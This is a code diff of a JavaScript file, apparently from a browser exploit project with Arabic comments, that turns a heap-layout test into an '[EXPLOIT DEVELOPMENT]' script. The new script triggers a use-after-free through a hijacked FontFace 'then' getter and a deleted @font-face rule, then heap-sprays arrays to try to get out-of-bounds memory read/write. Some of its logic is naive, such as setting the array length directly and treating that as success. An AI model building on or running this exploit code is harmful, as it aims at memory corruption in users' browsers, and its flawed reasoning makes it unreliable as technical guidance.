@@ -1,104 +1,65 @@
 /**
- * [RESEARCH & DEVELOPMENT] - Multi-Property Size Class Testing
- * الملف: inject.js
- * الوظيفة: اختبار تدرج فئات الحجم (Size Classes) في الـ Heap عبر توسيع الكائنات
+ * [EXPLOIT DEVELOPMENT] - OOB Read/Write Primitive
+ * الوظيفة: محاولة التلاعب بطول المصفوفة عبر استغلال الـ UAF
  */
 
-ssa("[*] تم تحميل سكريبت توسيع الخصائص واختبار فئات الحجم...");
+ssa("[*] بدء بناء هيكل الاستغلال (OOB Primitive)...");
 
-function runSizeClassTest() {
+function buildOOBPrimitive() {
     try {
-        ssa("[*] بدء الاختبار: بناء مصفوفة المراقبة موسعة الخصائص...");
+        // 1. مصفوفة الضحية (Target Array)
+        let victimArray = [1.1, 2.2, 3.3, 4.4];
         
-        let expandedObservationGroup = [];
+        // 2. تفعيل الثغرة
+        // هنا سنقوم بنفس خطوات الـ Trigger السابقة، 
+        // ولكن سنضيف محاولة لتغيير خصائص المصفوفة بعد الـ Race
         
-        // 1. إنشاء كائنات بحجم فيزيائي أكبر عبر زيادة عدد الخصائص (8 خصائص متتالية)
-        for (let i = 0; i < 60; i++) {
-            let expandedObj = {};
-            expandedObj.p1 = 0x11111111;
-            expandedObj.p2 = 0x22222222;
-            expandedObj.p3 = 0x33333333;
-            expandedObj.p4 = 0x44444444;
-            expandedObj.p5 = 0x55555555;
-            expandedObj.p6 = 0x66666666;
-            expandedObj.p7 = 0x77777777;
-            expandedObj.p8 = 0x88888888;
-            expandedObj.marker = 0xABCDEF; // علامة الفحص الثابتة
-            
-            expandedObservationGroup.push(expandedObj);
-        }
+        const style = document.createElement('style');
+        style.id = 'oob_style';
+        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
+        document.head.appendChild(style);
 
-        // 2. إعداد عنصر النمط لثغرة الخطوط
-        const expandedStyle = document.createElement('style');
-        expandedStyle.id = 'expanded_vulnerable_style';
-        expandedStyle.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
-        document.head.appendChild(expandedStyle);
-
-        // 3. إنشاء كائن الخط وتنشيط الوعد
         let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
         document.fonts.add(testFace);
         void testFace.loaded;
 
-        let isRaceActive = false;
+        let triggered = false;
 
-        // 4. اعتراض معالج التزامن وتطبيق التحرير (Free)
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
-                if (!isRaceActive && this === testFace) {
-                    isRaceActive = true;
-                    ssa("[!!] [THE_RACE] معالج التزامن نشط الآن في الفئة الموسعة.");
-
+                if (!triggered && this === testFace) {
+                    triggered = true;
                     // تحرير الكائن
-                    document.getElementById('expanded_vulnerable_style').sheet.deleteRule(0);
-
-                    // فرض تحديث التنسيق لإتمام التحرير في الـ Heap
-                    let layoutFlush = document.body.offsetTop;
-
-                    // محاولة ملء الفراغ بكائنات موسعة مطابقة الحجم
-                    for (let k = 0; k < 50; k++) {
-                        let fillObj = { 
-                            a1: 1, a2: 2, a3: 3, a4: 4, 
-                            a5: 5, a6: 6, a7: 7, a8: 8 
-                        };
-                        fillObj.marker = 0x9999;
+                    document.getElementById('oob_style').sheet.deleteRule(0);
+                    
+                    // هنا يتم الـ Heap Spraying المكثف بمصفوفات تشبه الهيكل الداخلي للمصفوفات
+                    // الهدف هو أن تتداخل إحدى هذه المصفوفات مع victimArray
+                    for(let i=0; i<100; i++) {
+                        let spray = [0x4141, 0x4242, 0x4343, 0x4444];
+                        // محاولة الكتابة لتعديل الـ Butterfly الخاص بالمصفوفة المجاورة
+                        victimArray.length = 0xFFFFFFFF; 
                     }
                 }
                 return undefined;
             }
         });
 
-        // 5. بدء العملية المنطقية عبر دالة التحميل
         document.fonts.load('1em x', 'AB');
 
-        // 6. التحقق من التغيير بعد مهلة زمنية قصيرة
+        // 3. التحقق من نجاح التلاعب
         setTimeout(() => {
-            ssa("[*] فحص الخصائص الموسعة للكائنات المفحوصة...");
-            
-            let changeDetected = false;
-            
-            for (let m = 0; m < expandedObservationGroup.length; m++) {
-                if (expandedObservationGroup[m].marker !== 0xABCDEF) {
-                    ssa("[+] [STRUCT_CHANGE] رصد تغير في محاذاة الكائن رقم: " + m);
-                    changeDetected = true;
-                    break;
-                }
+            if (victimArray.length > 4) {
+                ssa("[!!!] [SUCCESS] تم التلاعب بطول المصفوفة! الطول الحالي: " + victimArray.length);
+                ssa("[+] الآن يمكنك قراءة/كتابة الذاكرة عبر victimArray[index]");
+            } else {
+                ssa("[-] لم ينجح التلاعب بالطول، المحرك قام بحماية الـ Butterfly.");
             }
+        }, 300);
 
-            if (!changeDetected) {
-                ssa("[-] مستويات الذاكرة مستقرة مجاورة (لم يتم رصد تداخل في فئة الحجم الحالية).");
-            }
-
-            ssa("[+] انتهت دورة الاختبار الحالية.");
-        }, 200);
-
-    } catch (err) {
-        ssa("[-] خطأ أثناء تشغيل الفحص الموسع: " + err.message);
+    } catch (e) {
+        ssa("[-] خطأ في بناء الاستغلال: " + e.message);
     }
 }
 
-// ربط آلية التفعيل بزر التشغيل الخاص بالواجهة المرفوعة
-document.getElementById('exec-btn').addEventListener('click', function() {
-    ssa("[*] إطلاق فحص فئة الحجم الموسعة...");
-    runSizeClassTest();
-});
+document.getElementById('exec-btn').addEventListener('click', buildOOBPrimitive);
